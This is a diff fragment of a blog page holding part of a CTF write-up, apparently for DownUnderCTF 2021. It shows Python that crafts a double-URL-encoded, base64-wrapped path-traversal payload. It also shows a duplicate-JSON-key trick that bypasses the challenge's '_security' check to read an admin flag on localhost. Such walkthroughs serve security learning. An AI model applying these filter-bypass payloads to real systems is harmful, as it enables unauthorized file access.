+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> hex(ord(s))<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#39;0x&#39;</span>,<span style="color:#e6db74">&#39;%&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># first, replace ../ to .%2e/</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> payload<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#39;./&#39;</span>, urlenc(<span style="color:#e6db74">&#39;.&#39;</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;/&#39;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># http://127.0.0.1/static/images/.%2e/.%2e/admin/flag</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># second, i replace a and f</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> payload<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#39;admin&#39;</span>, urlenc(<span style="color:#e6db74">&#39;a&#39;</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;dmin&#39;</span>)<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#39;flag&#39;</span>, urlenc(<span style="color:#e6db74">&#39;f&#39;</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;lag&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># double encode to bypass unquote</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> payload<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#39;%61&#39;</span>, <span style="color:#e6db74">&#39;%2561&#39;</span>) \
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#39;%66&#39;</span>, <span style="color:#e6db74">&#39;%2566&#39;</span>)  \
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#39;.</span><span style="color:#e6db74">%2e</span><span style="color:#e6db74">&#39;</span>,<span style="color:#e6db74">&#39;</span><span style="color:#e6db74">%2e%252e</span><span style="color:#e6db74">&#39;</span>) \
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># finally, encode to base64</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> base64
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> base64<span style="color:#f92672">.</span>b64encode(payload<span style="color:#f92672">.</span>encode())
+</span></span><span style="display:flex;"><span>print(payload<span style="color:#f92672">.</span>decode())
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#aHR0cDovLzEyNy4wLjAuMS9zdGF0aWMvaW1hZ2VzLyUyZSUyNTJlLyUyZSUyNTJlLyUyNTYxZG1pbi8lMjU2NmxhZw==</span>
+</span></span></code></pre></div><p>It looks good, but not pass <code>_security</code> *so painful :(</p>
 <p>I stuck in a few hour, review the code again &hellip;</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">	<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">_checked</span>(self, key):
-		chk <span style="color:#f92672">=</span> <span style="color:#66d9ef">True</span>
-		<span style="color:#66d9ef">if</span> key <span style="color:#f92672">in</span> self<span style="color:#f92672">.</span>checked:
-			chk <span style="color:#f92672">=</span> <span style="color:#66d9ef">False</span>
-		<span style="color:#66d9ef">return</span> chk
-
-<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">_security</span>(self, key, value):
-		chk <span style="color:#f92672">=</span> <span style="color:#66d9ef">False</span>
-		<span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> self<span style="color:#f92672">.</span>_checked(key):
-			<span style="color:#66d9ef">return</span> chk
-		<span style="color:#66d9ef">if</span> self<span style="color:#f92672">.</span>_forbidden_chk(key, value):
-			chk <span style="color:#f92672">=</span> <span style="color:#66d9ef">True</span>
-		<span style="color:#66d9ef">if</span> key <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;img&#34;</span>:
-			value <span style="color:#f92672">=</span> b64decode(bytes(value,<span style="color:#e6db74">&#39;utf-8&#39;</span>))<span style="color:#f92672">.</span>decode()
-			<span style="color:#66d9ef">if</span> self<span style="color:#f92672">.</span>_forbidden_chk(key, value):
-				chk <span style="color:#f92672">=</span> <span style="color:#66d9ef">True</span>
-		<span style="color:#66d9ef">if</span> chk <span style="color:#f92672">==</span> <span style="color:#66d9ef">False</span>:
-			self<span style="color:#f92672">.</span>checked<span style="color:#f92672">.</span>append(key)
-		<span style="color:#66d9ef">return</span> chk
-</code></pre></div><p>Here if we duplicate key, first key will be checked and add to <code>self.checked</code>, thus second key will pass <code>security</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>	<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">_checked</span>(self, key):
+</span></span><span style="display:flex;"><span>		chk <span style="color:#f92672">=</span> <span style="color:#66d9ef">True</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> key <span style="color:#f92672">in</span> self<span style="color:#f92672">.</span>checked:
+</span></span><span style="display:flex;"><span>			chk <span style="color:#f92672">=</span> <span style="color:#66d9ef">False</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> chk
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">_security</span>(self, key, value):
+</span></span><span style="display:flex;"><span>		chk <span style="color:#f92672">=</span> <span style="color:#66d9ef">False</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> self<span style="color:#f92672">.</span>_checked(key):
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">return</span> chk
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> self<span style="color:#f92672">.</span>_forbidden_chk(key, value):
+</span></span><span style="display:flex;"><span>			chk <span style="color:#f92672">=</span> <span style="color:#66d9ef">True</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> key <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;img&#34;</span>:
+</span></span><span style="display:flex;"><span>			value <span style="color:#f92672">=</span> b64decode(bytes(value,<span style="color:#e6db74">&#39;utf-8&#39;</span>))<span style="color:#f92672">.</span>decode()
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">if</span> self<span style="color:#f92672">.</span>_forbidden_chk(key, value):
+</span></span><span style="display:flex;"><span>				chk <span style="color:#f92672">=</span> <span style="color:#66d9ef">True</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> chk <span style="color:#f92672">==</span> <span style="color:#66d9ef">False</span>:
+</span></span><span style="display:flex;"><span>			self<span style="color:#f92672">.</span>checked<span style="color:#f92672">.</span>append(key)
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> chk
+</span></span></code></pre></div><p>Here if we duplicate key, first key will be checked and add to <code>self.checked</code>, thus second key will pass <code>security</code>.</p>
 <p>Nice, final payload will be:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;aHR0cDovLzEyNy4wLjAuMS9zdGF0aWMvaW1hZ2VzLyUyZSUyNTJlLyUyZSUyNTJlLyUyNTYxZG1pbi8lMjU2NmxhZw==&#39;</span>
-payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;{&#34;img&#34;:&#34;&#39;</span><span style="color:#f92672">+</span> base64<span style="color:#f92672">.</span>b64encode(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;trash&#39;</span>)<span style="color:#f92672">.</span>decode() <span style="color:#f92672">+</span><span style="color:#e6db74">&#39;&#34;,&#34;img&#34;:&#34;&#39;</span> <span style="color:#f92672">+</span> payload <span style="color:#f92672">+</span><span style="color:#e6db74">&#39;&#34;}&#39;</span>
-print(payload)
-</code></pre></div><p>Post this payload and we will be gain flag</p>
-<p><img src="img/7.png" alt="7"></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;aHR0cDovLzEyNy4wLjAuMS9zdGF0aWMvaW1hZ2VzLyUyZSUyNTJlLyUyZSUyNTJlLyUyNTYxZG1pbi8lMjU2NmxhZw==&#39;</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;{&#34;img&#34;:&#34;&#39;</span><span style="color:#f92672">+</span> base64<span style="color:#f92672">.</span>b64encode(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;trash&#39;</span>)<span style="color:#f92672">.</span>decode() <span style="color:#f92672">+</span><span style="color:#e6db74">&#39;&#34;,&#34;img&#34;:&#34;&#39;</span> <span style="color:#f92672">+</span> payload <span style="color:#f92672">+</span><span style="color:#e6db74">&#39;&#34;}&#39;</span>
+</span></span><span style="display:flex;"><span>print(payload)
+</span></span></code></pre></div><p>Post this payload and we will be gain flag</p>
+<p>
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+  
+  
+
+    <img
+      class="borderless"
+      loading="lazy"
+      src="/posts/img/DownunderCTF2021/7.png"
+      alt="7"
+    />
+
+  
+
+</p>
+
+
+
+    </article>
+  </main>
+
 
     </div>
-    <div class="post-footer">
+    
+    <footer>
       
-    </div>
-  </article>
 
-    </main>
+
+  
+
+    
+
+    
+      
+      
+    
+    
+    <p>Welcome to my lord.</p>
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<section class="req-js">
+  <button class="outline-dashed" title="Change to light/dark mode."><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true"><use xlink:href="/img/bundle.min.fc89b321aa39dfb355170fc007ce5b94.svg#adjust"/></svg></button><input class="outline-dashed" type="color" list="presets" value="#1dbc91" title="Change accent color." aria-label="Change accent color."><datalist id="presets"><option value="#1f676b"><option value="#1dbc91"><option value="#f3a530"><option value="#902b37"><option value="#754e85"><option value="#7fc121"><option value="#a8314a"><option value="#ff7433"><option value="#3e6728"><option value="#c063bd"></datalist>
+</section>
+
+
+
+  <noscript>
+    <p class="noscript">Unable to execute JavaScript. Some features were disabled.</p>
+  </noscript>
+
+
+
+    </footer>
+    
+    
+    
+
+    
+    
+
   </body>
 </html>
